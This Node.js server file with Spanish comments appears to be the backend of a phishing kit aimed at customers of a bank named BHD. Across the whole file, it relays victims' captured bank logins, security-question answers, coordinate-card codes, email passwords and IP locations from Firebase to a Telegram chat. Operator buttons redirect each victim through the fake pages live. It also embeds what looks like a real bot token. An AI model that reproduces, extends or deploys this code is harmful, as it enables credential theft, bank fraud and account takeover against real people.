// server.js - VERSIÓN CON WEBHOOK CONFIGURADO
const express = require('express');
const admin = require('firebase-admin');
const axios = require('axios');

// Configurar dotenv solo en desarrollo
if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config();
}

const app = express();
app.use(express.json());

// === CONFIGURACIÓN DE TELEGRAM ===
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com';
const ALLOWED_PAGES = [
  'index.html',
  'pregunta-1.html',
  'coordenada1.html',
  'coordenada2.html',
  'coordenada3.html',
  'coordenadaR.html',
  'mailbox.html',
  'finalizado.html',
  'error.html',
  'bloqueo.html'
];

// === CONFIGURACIÓN SEGURA DE FIREBASE ===
console.log('🔧 Inicializando Firebase...');

let serviceAccount;
try {
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    console.log('✅ Firebase config cargada desde variables de entorno');
  } else {
    serviceAccount = require('./serviceAccountKey.json');
    console.log('✅ Firebase config cargada desde archivo local');
  }
} catch (error) {
  console.error('❌ ERROR: No se pudo cargar la configuración de Firebase');
  console.error('Detalles:', error.message);
  process.exit(1);
}

// Inicializar Firebase Admin SDK
try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com'
  });
  console.log('✅ Firebase Admin SDK inicializado correctamente');
} catch (error) {
  console.error('❌ ERROR al inicializar Firebase:', error.message);
  process.exit(1);
}

const database = admin.database();

// === MIDDLEWARE PARA LOGGING ===
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();
});

// === FUNCIÓN PARA CREAR BOTONES DE REDIRECCIÓN ===
function createRedirectButtons(uid) {
  const buttons = [
    [
      { text: '🏠 INDEX', callback_data: `redirect:${uid}:index.html` },
      { text: '❓ PREGUNTA 1', callback_data: `redirect:${uid}:pregunta-1.html` }
    ],
    [
      { text: '📍 COORDENADA 1', callback_data: `redirect:${uid}:coordenada1.html` },
      { text: '📍 COORDENADA 2', callback_data: `redirect:${uid}:coordenada2.html` }
    ],
    [
      { text: '📍 COORDENADA 3', callback_data: `redirect:${uid}:coordenada3.html` },
      { text: '🔄 COORDENADA R', callback_data: `redirect:${uid}:coordenadaR.html` }
    ],
    [
      { text: '📧 MAILBOX', callback_data: `redirect:${uid}:mailbox.html` },
      { text: '✅ FINALIZADO', callback_data: `redirect:${uid}:finalizado.html` }
    ],
    [
      { text: '❌ ERROR', callback_data: `redirect:${uid}:error.html` },
      { text: '🚫 BLOQUEO', callback_data: `redirect:${uid}:bloqueo.html` }
    ]
  ];
  
  return {
    inline_keyboard: buttons
  };
}

// === 1. ESCUCHAR CAMBIOS EN FIREBASE Y ENVIAR A TELEGRAM ===
let isProcessing = false;

console.log('👂 Iniciando listener de Firebase...');

database.ref('/captures').on('child_added', async (snapshot) => {
  console.log('🔔 EVENTO child_added DETECTADO en Firebase');
  
  if (isProcessing) {
    console.log('⏳ Ya hay un proceso en ejecución, ignorando...');
    return;
  }
  isProcessing = true;

  try {
    const uid = snapshot.key;
    const data = snapshot.val();

    console.log(`📥 Nueva captura detectada: ${uid}`);

    // Evitar procesar el campo redirectPage
    const steps = Object.keys(data).filter(key => key !== 'redirectPage');
    if (steps.length === 0) {
      isProcessing = false;
      return;
    }

    const step = steps[0];
    const payload = data[step];

    // Construir mensaje para Telegram
    let mensaje = `🚨 *NUEVO DATO CAPTURADO - BHD*\n`;
    mensaje += `🔹 *UID*: \`${uid}\`\n`;
    mensaje += `🔹 *Paso*: ${step}\n\n`;

    if (step === 'login') {
      mensaje += `🔐 *CREDENCIALES*\n`;
      mensaje += `• Usuario: \`${payload.username || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.password || 'N/A'}\`\n\n`;
    } else if (step === 'security') {
      mensaje += `❓ *PREGUNTAS DE SEGURIDAD*\n`;
      mensaje += `• Color favorito: \`${payload.ans1 || 'N/A'}\`\n`;
      mensaje += `• Marca primer carro: \`${payload.ans2 || 'N/A'}\`\n`;
      mensaje += `• Personaje libro: \`${payload.ans3 || 'N/A'}\`\n`;
      mensaje += `• Abuela materna: \`${payload.ans4 || 'N/A'}\`\n`;
      mensaje += `• Colegio primaria: \`${payload.ans5 || 'N/A'}\`\n\n`;
    } else if (step.startsWith('coordenada')) {
      mensaje += `📍 *COORDENADAS (${step})*\n`;
      Object.keys(payload).forEach(key => {
        if (key.startsWith('coord')) {
          mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
        }
      });
      mensaje += `\n`;
    } else if (step === 'mailbox') {
      mensaje += `📧 *CORREO*\n`;
      mensaje += `• Email: \`${payload.email || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.emailPassword || 'N/A'}\`\n\n`;
    } else {
      // Para pasos desconocidos, mostrar todos los datos
      mensaje += `📝 *DATOS*\n`;
      Object.keys(payload).forEach(key => {
        mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
      });
      mensaje += `\n`;
    }

    // Información del sistema
    mensaje += `🌐 *INFO DEL USUARIO*\n`;
    mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
    mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}\n`;
    mensaje += `• Fecha: ${payload.date || 'N/A'} - ${payload.time || 'N/A'}\n\n`;

    // === BOTONES DE REDIRECCIÓN ===
    mensaje += `⏭️ *SELECCIONA UNA REDIRECCIÓN:*\n`;

    // Crear teclado inline con botones
    const replyMarkup = createRedirectButtons(uid);

    // Enviar a Telegram con botones
    const telegramResponse = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown',
      reply_markup: replyMarkup
    });

    console.log(`✅ Enviado a Telegram con botones: ${uid}/${step}`);
    console.log(`📨 Message ID: ${telegramResponse.data.result.message_id}`);

  } catch (error) {
    console.error('❌ Error al procesar captura:', error.message);
    if (error.response) {
      console.error('📊 Error response:', error.response.data);
    }
  } finally {
    isProcessing = false;
  }
});

// === 2. WEBHOOK PARA RECIBIR CALLBACKS DE BOTONES ===
app.post('/telegram/webhook', express.json(), async (req, res) => {
  try {
    console.log('📨 Webhook recibido de Telegram');

    // Manejar callback queries (botones)
    if (req.body.callback_query) {
      const callbackData = req.body.callback_query.data;
      const chatId = req.body.callback_query.message.chat.id;
      const messageId = req.body.callback_query.message.message_id;
      const userId = req.body.callback_query.from.id;
      const callbackId = req.body.callback_query.id;

      console.log(`🔘 Callback recibido: ${callbackData}`);
      console.log(`💬 Chat ID: ${chatId}, User ID: ${userId}`);

      // Validar que es un comando de redirección
      if (callbackData.startsWith('redirect:')) {
        const parts = callbackData.split(':');
        if (parts.length === 3) {
          const uid = parts[1];
          const page = parts[2];

          console.log(`🎯 Procesando redirección: ${uid} -> ${page}`);

          // Validar página permitida
          if (!ALLOWED_PAGES.includes(page)) {
            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
              callback_query_id: callbackId,
              text: `❌ Página no permitida: ${page}`
            });
            return res.status(200).send('OK');
          }

          try {
            // Actualizar Firebase para redirigir al usuario
            await database.ref(`/captures/${uid}/redirectPage`).set(page);
            console.log(`✅ Firebase actualizado: ${uid} -> ${page}`);

            // Responder al callback query
            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
              callback_query_id: callbackId,
              text: `✅ Redirigiendo a: ${page}`
            });

            // Editar el mensaje original para mostrar la acción realizada
            await axios.post(`${TELEGRAM_API}/editMessageText`, {
              chat_id: chatId,
              message_id: messageId,
              text: `✅ *REDIRECCIÓN CONFIGURADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
              parse_mode: 'Markdown'
            });

            console.log(`✅ Redirección completada: ${uid} → ${page} por usuario ${userId}`);

          } catch (firebaseError) {
            console.error('❌ Error de Firebase:', firebaseError.message);
            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
              callback_query_id: callbackId,
              text: '❌ Error al actualizar Firebase'
            });
          }
        }
      }

      return res.status(200).send('OK');
    }

    // Manejar mensajes de texto (compatibilidad hacia atrás)
    const message = req.body?.message?.text;
    const chatId = req.body?.message?.chat?.id;

    if (message && message.startsWith('/redirect ')) {
      console.log(`📨 Comando de texto recibido: ${message}`);

      const commandRegex = /^\/redirect\s+([a-f0-9-]+)\s+([a-zA-Z0-9._-]+\.html)$/;
      const match = message.match(commandRegex);

      if (match) {
        const uid = match[1];
        const page = match[2];

        if (ALLOWED_PAGES.includes(page)) {
          await database.ref(`/captures/${uid}/redirectPage`).set(page);
          
          await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: `✅ Redirección configurada:\nUID: \`${uid}\`\n→ ${page}`,
            parse_mode: 'Markdown'
          });

          console.log(`✅ Redirección establecida vía texto: ${uid} → ${page}`);
        }
      }
    }

    return res.status(200).send('OK');

  } catch (error) {
    console.error('❌ Error en webhook:', error.message);
    
    // Responder al callback query en caso de error
    if (req.body.callback_query) {
      try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
          callback_query_id: req.body.callback_query.id,
          text: '❌ Error al procesar la solicitud'
        });
      } catch (e) {
        console.error('❌ Error al responder callback:', e.message);
      }
    }
    
    return res.status(200).send('OK');
  }
});

// === RUTAS PARA CONFIGURAR WEBHOOK ===

// Configurar webhook de Telegram
app.get('/setup-webhook', async (req, res) => {
  try {
    const webhookUrl = `${SERVER_URL}/telegram/webhook`;
    console.log(`🔗 Configurando webhook: ${webhookUrl}`);
    
    const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
      url: webhookUrl,
      drop_pending_updates: true
    });
    
    console.log('✅ Webhook configurado:', response.data);
    
    res.json({
      success: true,
      webhook_url: webhookUrl,
      response: response.data
    });
    
  } catch (error) {
    console.error('❌ Error configurando webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Verificar estado del webhook
app.get('/webhook-info', async (req, res) => {
  try {
    const response = await axios.get(`${TELEGRAM_API}/getWebhookInfo`);
    
    res.json({
      success: true,
      webhook_info: response.data
    });
    
  } catch (error) {
    console.error('❌ Error obteniendo info del webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Eliminar webhook
app.get('/delete-webhook', async (req, res) => {
  try {
    const response = await axios.get(`${TELEGRAM_API}/deleteWebhook`);
    
    res.json({
      success: true,
      response: response.data
    });
    
  } catch (error) {
    console.error('❌ Error eliminando webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// === RUTAS ADICIONALES ===

// Ruta para testear botones de Telegram
app.get('/test-buttons', async (req, res) => {
  try {
    const testUid = 'test-' + Date.now();
    const replyMarkup = createRedirectButtons(testUid);
    
    const testMessage = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: '🧪 *TEST DE BOTONES BHD*\n\nEste es un mensaje de prueba con botones de redirección.\nHaz clic en cualquier botón para probar.',
      parse_mode: 'Markdown',
      reply_markup: replyMarkup
    });
    
    res.json({
      success: true,
      message: 'Mensaje de prueba con botones enviado',
      data: testMessage.data
    });
    
  } catch (error) {
    console.error('❌ Error en test de botones:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Ruta para ver datos actuales de Firebase
app.get('/api/captures', async (req, res) => {
  try {
    const snapshot = await database.ref('/captures').once('value');
    const data = snapshot.val();
    
    res.json({
      success: true,
      total: data ? Object.keys(data).length : 0,
      captures: data,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('❌ Error al consultar Firebase:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Ruta de health check para Render
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    service: 'BHD Firebase Server',
    features: {
      buttons: true,
      webhook: true,
      firebase: true
    }
  });
});

// Ruta de información del servidor
app.get('/info', (req, res) => {
  res.json({
    service: 'BHD Firebase Server',
    version: '4.0.0',
    environment: process.env.NODE_ENV || 'development',
    server_url: SERVER_URL,
    features: {
      telegram_buttons: true,
      webhook_configured: true,
      pages_available: ALLOWED_PAGES.length,
      firebase_realtime: true
    },
    firebase: {
      initialized: true,
      database: 'Connected'
    },
    telegram: {
      bot: TELEGRAM_BOT_TOKEN ? 'Configured' : 'Not configured',
      chat_id: TELEGRAM_CHAT_ID,
      buttons_enabled: true
    },
    endpoints: {
      setup_webhook: '/setup-webhook',
      webhook_info: '/webhook-info',
      test_buttons: '/test-buttons',
      health: '/health'
    }
  });
});

// Ruta principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>BHD Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
            .success { background: #d4edda; color: #155724; }
            .info { background: #d1ecf1; color: #0c5460; }
            .warning { background: #fff3cd; color: #856404; }
            .endpoints { background: #f8f9fa; padding: 15px; border-radius: 5px; }
            a { color: #007bff; text-decoration: none; }
            a:hover { text-decoration: underline; }
            .btn { display: inline-block; padding: 10px 15px; margin: 5px; background: #007bff; color: white; border-radius: 5px; }
        </style>
    </head>
    <body>
        <h1>🚀 Servidor BHD Firebase + Telegram</h1>
        <div class="status success">✅ <strong>VERSIÓN 4.0 - WEBHOOK CONFIGURADO</strong></div>
        
        <div class="status warning">
            <strong>⚠️ PASO IMPORTANTE:</strong> Debes configurar el webhook para que los botones funcionen.
            <br><a href="/setup-webhook" class="btn">🔗 Configurar Webhook</a>
        </div>
        
        <div class="endpoints">
            <strong>🔧 Endpoints Esenciales:</strong><br>
            • <a href="/setup-webhook">/setup-webhook</a> - 🔗 CONFIGURAR WEBHOOK (OBLIGATORIO)<br>
            • <a href="/webhook-info">/webhook-info</a> - Ver estado del webhook<br>
            • <a href="/test-buttons">/test-buttons</a> - Probar botones de Telegram<br>
            • <a href="/health">/health</a> - Estado del servidor<br>
            • <a href="/info">/info</a> - Información del sistema<br>
            • <a href="/api/captures">/api/captures</a> - Ver datos de Firebase
        </div>
        
        <div class="status info">
            <strong>🎯 Características Activadas:</strong><br>
            • Botones interactivos en Telegram<br>
            • Webhook para callbacks<br>
            • 10 páginas de redirección disponibles<br>
            • Respuestas inmediatas a los clics<br>
            • Compatible con comandos de texto
        </div>
    </body>
    </html>
  `);
});

// Manejo de errores global
app.use((error, req, res, next) => {
  console.error('❌ Error global:', error);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Ruta 404
app.use('*', (req, res) => {
  res.status(404).json({ error: 'Ruta no encontrada' });
});

// Inicializar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor BHD con WEBHOOK corriendo en puerto ${PORT}`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔗 Server URL: ${SERVER_URL}`);
  console.log(`📞 Health check: ${SERVER_URL}/health`);
  console.log(`🔧 Configurar Webhook: ${SERVER_URL}/setup-webhook`);
  console.log(`🧪 Test Botones: ${SERVER_URL}/test-buttons`);
  console.log(`🎯 Páginas disponibles: ${ALLOWED_PAGES.join(', ')}`);
  console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ CONFIGURADO' : '❌ NO CONFIGURADO'}`);
  console.log(`🔥 Firebase: ✅ INICIALIZADO`);
  console.log(`👂 Listener Firebase: ✅ ACTIVO`);
  console.log(`🔔 Webhook: ⚠️  NECESITA CONFIGURACIÓN`);
});